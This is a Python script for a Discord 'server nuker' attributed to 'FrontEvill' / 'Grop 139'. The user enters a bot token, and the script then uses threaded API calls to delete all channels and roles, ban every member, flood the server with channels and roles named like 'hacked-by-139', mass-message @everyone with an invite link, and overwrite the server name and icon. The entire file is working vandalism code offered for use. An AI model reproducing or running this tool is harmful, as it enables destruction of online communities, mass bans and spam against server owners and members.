import os
import base64
import random
import requests
from colorama import Fore, init

init(autoreset=True)

def gradient_text(text):
    mid = len(text) // 2
    return Fore.WHITE + text[:mid] + Fore.LIGHTRED_EX + text[mid:]

TOKEN      = ""
GUILD_ID   = {}
GUILD_INFO = {}
HEADERS    = {
    "Authorization" : f"Bot {TOKEN}",
    "Content-Type"  : "application/json",
}
BASE_URL = "https://discord.com/api/v10"

CHANNEL_NAMES = [
    "hacked-by-139",
    "grop-139",
    "frontevillishere",
    "fucked-by-frontevilll",
]

BANNER_MESSAGES = [
    "Ha2cked By FrontEvill",
    "Fucked By FrontEvill",
    "Ha2cked By Ako",
    "Ha2cked By Louies",
    "Fucked By Louris",
    "Ha2cked By AlM7rren",
    "FrontEvill Is Here",
    "Grop 139",
    "139",
    "Ha2cked By 139",
    "Fucked By Ako",
    "Fucked By Louis",
]

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

SESSION = requests.Session()

def fast_request(method, url, **kwargs):
    try:
        return SESSION.request(method, url, headers=HEADERS, timeout=15, **kwargs)
    except Exception as e:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Error: {e}"))
        return None


def _delete_one_channel(channel):
    cid   = channel.get("id", "")
    cname = channel.get("name", "Unknown")
    r = fast_request("DELETE", f"{BASE_URL}/channels/{cid}")
    if r and r.status_code == 200:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Deleted channel » {cname}"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to delete » {cname}"))

def delete_all_channels():
    r = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/channels")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch channels"))
        return
    channels = r.json()
    if not channels:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No channels found"))
        return
    threads = [__import__("threading").Thread(target=_delete_one_channel, args=(ch,)) for ch in channels]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {len(channels)} channels deleted"))


def _create_one_channel(i):
    name = random.choice(CHANNEL_NAMES)
    r = fast_request("POST", f"{BASE_URL}/guilds/{GUILD_ID}/channels",
                     json={"name": name, "type": 0})
    if r and r.status_code == 201:
        cid = r.json().get("id", "N/A")
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Created channel #{i+1} » {name} » ID: {cid}"))
    else:
        code = r.status_code if r else "N/A"
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to create channel #{i+1} — {code}"))

def create_spam_channels():
    try:
        total = int(input(Fore.RED + "  ┌(" + Fore.WHITE + "how many channels" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip())
        if total < 1:
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Must be at least 1"))
            return
    except ValueError:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid number"))
        return
    try:
        name_count = int(input(Fore.RED + "  ┌(" + Fore.WHITE + "how many names? (1-10)" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip())
        name_count = max(1, min(10, name_count))
    except ValueError:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid number"))
        return
    names = []
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(f" Enter {name_count} name(s), one per line:"))
    for i in range(name_count):
        n = input(Fore.RED + "  ┌(" + Fore.WHITE + f"name {i+1}" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip()
        names.append(n if n else f"hacked-{i+1}")
    def _create(i):
        name = random.choice(names)
        r = fast_request("POST", f"{BASE_URL}/guilds/{GUILD_ID}/channels", json={"name": name, "type": 0})
        if r and r.status_code == 201:
            cid = r.json().get("id", "N/A")
            print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Created #{i+1} » {name} » ID: {cid}"))
        else:
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to create #{i+1}"))
    threads = [__import__("threading").Thread(target=_create, args=(i,)) for i in range(total)]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {total} channels created"))


def _rename_one_channel(args):
    ch, new_name = args
    old = ch.get("name", "")
    r = fast_request("PATCH", f"{BASE_URL}/channels/{ch['id']}",
                     json={"name": new_name})
    if r and r.status_code == 200:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Renamed {old} → {new_name}"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to rename {old}"))

def rename_all_channels():
    new_name = input(
        Fore.RED + "  ┌(" + Fore.WHITE + "new name" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n"
        + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX
    ).strip()
    r = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/channels")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch channels"))
        return
    text_channels = [c for c in r.json() if isinstance(c, dict) and c.get("type") == 0]
    if not text_channels:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No text channels found"))
        return
    threads = [__import__("threading").Thread(target=_rename_one_channel, args=((ch, new_name),)) for ch in text_channels]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {len(text_channels)} channels renamed"))


def _delete_one_role(role):
    rid   = role.get("id", "")
    rname = role.get("name", "")
    r = fast_request("DELETE", f"{BASE_URL}/guilds/{GUILD_ID}/roles/{rid}")
    if r and r.status_code == 204:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Deleted role » {rname}"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to delete role » {rname}"))

def delete_all_roles():
    r = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/roles")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch roles"))
        return
    deletable = [x for x in r.json() if isinstance(x, dict) and x.get("name") != "@everyone"]
    if not deletable:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No deletable roles found"))
        return
    threads = [__import__("threading").Thread(target=_delete_one_role, args=(role,)) for role in deletable]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {len(deletable)} roles deleted"))


def fast_mass_message():
    r = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/channels")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch channels"))
        return
    text_channels = [c for c in r.json() if isinstance(c, dict) and c.get("type") == 0]
    if not text_channels:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No text channels found"))
        return
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(" Enter the message to send:"))
    msg = input(Fore.RED + "  ┌(" + Fore.WHITE + "message" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip()
    if not msg:
        msg = "@everyone @here\nقروب فرونت يسلم عليكممممم\n\ndiscord.gg/z9sMdkBYMD\nhttps://cdn.discordapp.com/attachments/1473717830502322229/1497249353947943032/Screenshot_------_com.miui.mediaviewer-edit.jpg?ex=69ee271f&is=69ecd59f&hm=150ca013c14ccdaa0c20555e30a7709dbf32b824813c1c562f055f0c8c702784"
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(f" How many times per channel? (1-10)"))
    try:
        repeat_count = int(input(Fore.RED + "  ┌(" + Fore.WHITE + "repeat" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip())
        repeat_count = max(1, min(10, repeat_count))
    except ValueError:
        repeat_count = 1
    lock    = __import__("threading").Lock()
    counter = [0]
    threads = []
    def _send(ch):
        for _ in range(repeat_count):
            try:
                resp = SESSION.request("POST", f"{BASE_URL}/channels/{ch['id']}/messages",
                                       headers=HEADERS, json={"content": msg}, timeout=15)
                if resp and resp.status_code == 200:
                    with lock:
                        counter[0] += 1
                        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Sent #{counter[0]} » {ch.get('name', '')}"))
                else:
                    code = resp.status_code if resp else "N/A"
                    print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed » {ch.get('name', '')} — {code}"))
            except Exception as e:
                print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Error: {e}"))
    for ch in text_channels:
        t = __import__("threading").Thread(target=_send, args=(ch,))
        threads.append(t)
        t.start()
    for t in threads:
        t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {counter[0]}/{len(text_channels)} messages sent"))


def _ban_one_member(member):
    user  = member.get("user", {}) if isinstance(member, dict) else {}
    uid   = user.get("id", "")
    uname = user.get("username", "unknown")
    r = fast_request("PUT", f"{BASE_URL}/guilds/{GUILD_ID}/bans/{uid}",
                     json={"delete_message_days": 7})
    if r and r.status_code in (200, 204):
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Banned » {uname} | ID: {uid}"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to ban » {uname}"))

def ban_all_members():
    r = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/members?limit=1000")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch members"))
        return
    members = r.json()
    if not members:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No members found"))
        return
    threads = [__import__("threading").Thread(target=_ban_one_member, args=(m,)) for m in members]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {len(members)} members banned"))


def change_server_icon():
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(" Enter image URL for server icon:"))
    icon_url = input(Fore.RED + "  ┌(" + Fore.WHITE + "url" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip()
    if not icon_url:
        icon_url = "https://cdn.discordapp.com/attachments/1488219899741339648/1497618303311675623/7487023409735533586_avatar.png.jpg?ex=69ee2d3b&is=69ecdbbb&hm=22a8d112bc80efd9426b404415841446f1a27b5964b3724ea9d56da5d8059cf8"
    ir = fast_request("GET", icon_url)
    if not ir or ir.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch icon"))
        return
    icon_b64  = base64.b64encode(ir.content).decode("utf-8")
    icon_data = f"data:image/jpeg;base64,{icon_b64}"
    r = fast_request("PATCH", f"{BASE_URL}/guilds/{GUILD_ID}", json={"icon": icon_data})
    if r and r.status_code == 200:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(" Server icon changed successfully"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to change icon — {r.status_code if r else 'N/A'}"))


def change_server_name():
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(" Enter new server name:"))
    new_name = input(Fore.RED + "  ┌(" + Fore.WHITE + "name" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip()
    if not new_name:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Name cannot be empty"))
        return
    r = fast_request("PATCH", f"{BASE_URL}/guilds/{GUILD_ID}", json={"name": new_name})
    if r and r.status_code == 200:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Server name changed to: {new_name}"))
    else:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to change name — {r.status_code if r else 'N/A'}"))


def _create_one_role(i):
    name = random.choice(BANNER_MESSAGES)
    r = fast_request("POST", f"{BASE_URL}/guilds/{GUILD_ID}/roles",
                     json={"name": name})
    if r and r.status_code == 200:
        print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Created role #{i+1} » {name}"))
    else:
        code = r.status_code if r else "N/A"
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to create role #{i+1} — {code}"))

def create_spam_roles():
    try:
        total = int(input(Fore.RED + "  ┌(" + Fore.WHITE + "how many roles" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip())
        if total < 1:
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Must be at least 1"))
            return
    except ValueError:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid number"))
        return
    try:
        name_count = int(input(Fore.RED + "  ┌(" + Fore.WHITE + "how many names? (1-10)" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip())
        name_count = max(1, min(10, name_count))
    except ValueError:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid number"))
        return
    names = []
    print(Fore.RED + "  [" + Fore.GREEN + "?" + Fore.RED + "]" + gradient_text(f" Enter {name_count} name(s), one per line:"))
    for i in range(name_count):
        n = input(Fore.RED + "  ┌(" + Fore.WHITE + f"name {i+1}" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n" + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX).strip()
        names.append(n if n else random.choice(BANNER_MESSAGES))
    def _create_r(i):
        name = random.choice(names)
        r = fast_request("POST", f"{BASE_URL}/guilds/{GUILD_ID}/roles", json={"name": name})
        if r and r.status_code == 200:
            print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Created role #{i+1} » {name}"))
        else:
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Failed to create role #{i+1}"))
    threads = [__import__("threading").Thread(target=_create_r, args=(i,)) for i in range(total)]
    for t in threads: t.start()
    for t in threads: t.join()
    print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(f" Done — {total} roles created"))


def get_guilds():
    r = fast_request("GET", f"{BASE_URL}/users/@me/guilds")
    if not r or r.status_code != 200:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to fetch servers"))
        return False
    guilds = r.json()
    if not guilds:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" No servers found"))
        return False
    for i, g in enumerate(guilds):
        print(Fore.RED + "  [" + Fore.GREEN + "=" + Fore.RED + "]" + Fore.WHITE + f" {i} | {g.get('name','')} | ID: " + Fore.GREEN + g.get("id",""))
    try:
        selected = int(input(
            Fore.RED + "\n  ┌(" + Fore.WHITE + "select" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]\n"
            + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX
        ).strip())
    except ValueError:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid input"))
        return False
    if not (0 <= selected < len(guilds)):
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid selection"))
        return False

    global GUILD_ID, GUILD_INFO
    GUILD_ID = guilds[selected]["id"]

    gr = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}")
    gd = gr.json() if gr else {}
    owner_id     = gd.get("owner_id", "")
    member_count = gd.get("approximate_member_count", "Unknown")

    owner_r    = fast_request("GET", f"{BASE_URL}/users/{owner_id}")
    owner_name = owner_r.json().get("username", "") if owner_r else ""

    ch_r     = fast_request("GET", f"{BASE_URL}/guilds/{GUILD_ID}/channels")
    ch_list  = ch_r.json() if ch_r and ch_r.status_code == 200 else []
    total_ch = len(ch_list)
    text_ch  = len([c for c in ch_list if isinstance(c, dict) and c.get("type") == 0])
    voice_ch = len([c for c in ch_list if isinstance(c, dict) and c.get("type") == 2])

    GUILD_INFO = {
        "id"           : GUILD_ID,
        "name"         : gd.get("name", ""),
        "owner"        : owner_name,
        "member_count" : member_count,
        "total_ch"     : total_ch,
        "text_ch"      : text_ch,
        "voice_ch"     : voice_ch,
    }
    return True


def menu():
    while True:
        clear_screen()

        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⡀⠤⠤⠤⣄⡠⠤⠐⠐⠐⠐⠐⠐⠐⠐⣲⣤⣤⣄⡀")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡤⣒⣽⡶⠞⠛⠛⠛⠛⢶⣝⢶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣄")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠞⢡⣾⠏⠁⠀⠀⠀⠀⠀⣀⣀⣽⣆⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣖⠉⠉⠀⠀⠀⠉⠓⠒⠒⠒⠒⠲⠾⠧⠤⢤⣿⣧⠙⠻⠿⠿⠿⣟⣛⣛⡛⠉⠉⠉⠉⠉⠉⠉⠉⠁")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠒⠲⡦⢬⣭⣉⣑⣒⣶⣤⣤⡤⢶⠶⣤⡄⣀⣀⣀⡹⣷⡀")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠀⠀⢀⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣤⡀⠀⠳⢾⣿⣿⠿⠿⠟⢁⣿⣿⣿⣿⣿⣿⣿⣿⡿⠇⠉⠙")
        print(Fore.LIGHTRED_EX + "⠀⠀⠀⠀⠀⠀   ⣿⣀⢠⣿⢟⠻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⡀⠀⠀⠀⠀⠀⠀⠠⠈⠉⠙⢻⣿⣿⣿⣋⣀⣀⣠⣴")
        print(Fore.LIGHTRED_EX + " ⠀⠀⠀⠀⠀⠀⠀⠀⢹⡈⢹⣿⠴⣶⢾⡇⠀⠀⣀⣀⣀⣀⣀⣀⣀⣀⣀⡀⢸⣿⣿⣿⣿⣧⠀⢷⣶⣶⣶⣶⠋⣲⣷⣶⣿⣿⣿⣿⣿⣿⣿⣿⣇⣿⡶")
        print(Fore.LIGHTRED_EX + " ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠓⠾⣿⡶⠙⣿⣿⣀⣀⣀⣉⣉⣉⣉⣉⣉⣉⣉⣉⣸⣿⣿⣿⣿⣿⣄⣈⣉⣉⣭⣥⣶⡾⠿⠿⠿⠿⠟⠛⣿⣿⣿⣿⣋⣁")
        print(Fore.LIGHTRED_EX + "     ⠀    ⠤⣬⣽⠖⣿⣿⣿⣿⣷⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣿⣷⣾⣿⣿⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿")
        print()
        print(Fore.WHITE + "                                                                                      ID SERVER        : " + Fore.GREEN + str(GUILD_INFO.get("id", "Unknown")))
        print(Fore.WHITE + "                                                                                      NAME SERVER      : " + Fore.GREEN + GUILD_INFO.get("name", "Unknown"))
        print(Fore.WHITE + "                                                                                      OWNER SERVER     : " + Fore.GREEN + GUILD_INFO.get("owner", "Unknown"))
        print(Fore.WHITE + "                                                                                      Member Server    : " + Fore.GREEN + str(GUILD_INFO.get("member_count", "Unknown")))
        print(Fore.WHITE + "                                                                                      Total Channels   : " + Fore.GREEN + str(GUILD_INFO.get("total_ch", "Unknown")))
        print(Fore.WHITE + "                                                                                      Text Channels    : " + Fore.GREEN + str(GUILD_INFO.get("text_ch", "Unknown")))
        print(Fore.WHITE + "                                                                                      Voice Channels   : " + Fore.GREEN + str(GUILD_INFO.get("voice_ch", "Unknown")))
        print()
        print(Fore.WHITE + "                       " + Fore.RED + "Are" + Fore.WHITE + " you ready " + Fore.RED + " for " + Fore.WHITE + " more " + Fore.RED + "Problems" + Fore.WHITE + "??")
        print(Fore.WHITE + "                                            " + Fore.RED + "By " + Fore.WHITE + "-= " + Fore.GREEN + "FrontEvill" + Fore.WHITE + " -=")
        print(Fore.RED   + "     ═══════════════════════════════════════════════════════════════")
        print()
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#1" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Delete Channels      "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#2" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Create Channels      "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#3" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Rename Channels      "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#4" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Delete Roles         "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#5" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" fast mass message    "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#6" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Ban All Members      "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#7" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Change Server Icon   "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#8" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Change Server Name   "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "#9" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Create Roles         "))
        print(Fore.WHITE + "               " + Fore.RED + "⟨" + Fore.GREEN + "xx" + Fore.RED + "⟩" + Fore.LIGHTRED_EX + "  >  " + gradient_text(" Exit                 "))
        print()
        choice = input(
            Fore.RED + "  ┌(" + Fore.WHITE + "FrontEvill" + Fore.RED + ")-[" + Fore.WHITE + "root" + Fore.RED + "]" + "\n"
            + Fore.RED + "  └─" + Fore.WHITE + "$  " + Fore.LIGHTRED_EX
        ).strip()

        if   choice == "1":  delete_all_channels()
        elif choice == "2":  create_spam_channels()
        elif choice == "3":  rename_all_channels()
        elif choice == "4":  delete_all_roles()
        elif choice == "5":  fast_mass_message()
        elif choice == "6":  ban_all_members()
        elif choice == "7":  change_server_icon()
        elif choice == "8":  change_server_name()
        elif choice == "9":  create_spam_roles()
        elif choice == "xx":
            print(Fore.RED + "  [" + Fore.GREEN + "+" + Fore.RED + "]" + gradient_text(" Good By Man ..."))
            break
        else:
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Invalid choice"))


if __name__ == "__main__":
    try:
        TOKEN = input(Fore.LIGHTWHITE_EX + '[' + Fore.RED + '+' + Fore.LIGHTWHITE_EX + ']' + Fore.WHITE + " Enter Your TOken Bot: " + Fore.RED).strip()
        HEADERS["Authorization"] = f"Bot {TOKEN}"
        SESSION.headers.update(HEADERS)
        if not get_guilds():
            print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(" Failed to initialize. Exiting..."))
        else:
            menu()
    except KeyboardInterrupt:
        print(Fore.WHITE + "\n  Program Interrupted by User")
    except Exception as e:
        print(Fore.RED + "  [" + Fore.GREEN + "!" + Fore.RED + "]" + gradient_text(f" Fatal Error: {e}"))
